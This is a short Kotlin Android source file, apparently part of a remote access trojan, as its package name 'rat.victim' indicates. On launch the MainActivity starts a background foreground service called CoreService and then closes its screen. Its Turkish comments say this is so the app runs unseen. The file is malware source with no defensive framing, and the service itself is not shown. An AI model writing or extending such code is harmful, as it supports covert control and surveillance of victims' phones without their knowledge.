package com.yourname.rat.victim

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Servisi başlat
        val serviceIntent = Intent(this, com.yourname.rat.victim.services.CoreService::class.java)
        startForegroundService(serviceIntent)
        finish() // Ekranı kapat, arka planda çalışsın
    }
}